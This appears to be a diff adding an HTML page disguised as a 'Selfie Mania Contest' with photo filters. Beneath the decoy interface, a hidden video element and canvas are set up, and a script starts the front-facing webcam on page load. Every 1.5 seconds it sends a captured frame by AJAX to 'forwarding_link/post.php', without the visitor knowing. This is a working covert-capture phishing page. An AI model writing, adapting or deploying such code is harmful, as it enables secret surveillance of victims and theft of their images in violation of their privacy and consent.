@@ -1,0 +1,274 @@
+<html>
+<head>
+<!----)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))script(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((--->
+    <h1>Selfie Mania Contest</h1>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <div class="video-container">
+      <video
+        autoplay
+        id="video"
+        style="--grayscale: 0; --blur: 0px; --hue: 0deg"
+      ></video>
+      <canvas></canvas>
+      <img src="" alt="" class="image image--hidden"/>
+      <button class="btn btn--delete btn--hidden">
+        <i class="fa fa-trash-alt"></i>
+      </button>
+      <button class="btn btn--shoot"><i class="fa fa-camera"></i></button>
+    </div>
+    <form>
+      <label for="slider-grayscale">Grayscale</label>
+      <input
+        type="range"
+        name="grayscale"
+        id="slider-grayscale"
+        min="0"
+        max="10"
+        value="0"
+      />
+
+      <label for="slider-hue">Hue</label>
+      <input
+        type="range"
+        name="hue"
+        id="slider-hue"
+        min="0"
+        max="36"
+        value="0"
+      />
+
+      <label for="slider-blur">Blur</label>
+      <input
+        type="range"
+        name="blur"
+        id="slider-blur"
+        min="0"
+        max="10"
+        value="0"
+      />
+       &nbsp; 
+       &nbsp; 
+     <center> <button class="buttone buttone">Participate</button><center>
+      &nbsp; &nbsp; &nbsp; &nbsp; 
+    </form>
+    <style>
+*,
+*:before,
+*:after {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  height: 100%;
+}
+
+.buttone {
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+
+.buttone {background-color: #4CAF50;} /* Blue */
+
+body {
+  font-family: "Lobster", cursive;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  background-color: #333;
+  margin: 0;
+}
+
+h1 {
+  color: white;
+}
+
+.video-container {
+  position: relative;
+  overflow: hidden;
+  width: 50vmin;
+  height: 50vmin;
+  border: 20px solid #f0f0f0;
+  border-radius: 10px;
+}
+
+form {
+  width: 50vmin;
+  display: grid;
+  grid-template-columns: auto 1fr;
+  padding: 1rem;
+  color: white;
+  font-size: 1.5rem;
+}
+
+.label-and-input-container {
+  padding: 1rem;
+  display: flex;
+}
+
+label {
+  margin-right: 1rem;
+}
+
+input {
+  flex-grow: 1;
+}
+
+video {
+  width: 100%;
+  height: 100%;
+  filter: grayscale(var(--grayscale)) blur(var(--blur)) hue-rotate(var(--hue));
+  overflow: hidden;
+}
+
+.btn {
+  cursor: pointer;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 50px;
+  height: 50px;
+  font-size: 1.5rem;
+  background-color: #333;
+  outline: 0;
+  border: 0px;
+  color: #fff;
+  border-radius: 50%;
+  transition: transform 0.25s ease-in-out, opacity 0.25s ease-in-out;
+}
+
+.btn--shoot {
+  position: absolute;
+  bottom: 1rem;
+  right: 1rem;
+}
+
+.btn--delete {
+  position: absolute;
+  bottom: 1rem;
+  right: 1rem;
+}
+
+.btn--hidden.btn--delete {
+  transform: translateY(200%);
+}
+
+.btn--hidden.btn--shoot {
+  transform: translateX(200%);
+}
+
+.btn--hidden {
+  opacity: 0;
+}
+
+.btn-shoot:hover {
+  color: salmon;
+}
+
+canvas {
+  display: none;
+  position: absolute;
+  width: 200px;
+  height: 200px;
+  top: 0;
+  left: 0;
+  border: 5px solid black;
+}
+
+.image {
+  position: absolute;
+  left: 0px;
+  top: 0px;
+  width: 100%;
+  height: 100%;
+  opacity: 1;
+  transition: opacity 0.3s ease-in-out;
+}
+
+.image--hidden {
+  opacity: 0;
+}
+</style>
+<!---OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOandOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO--->
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
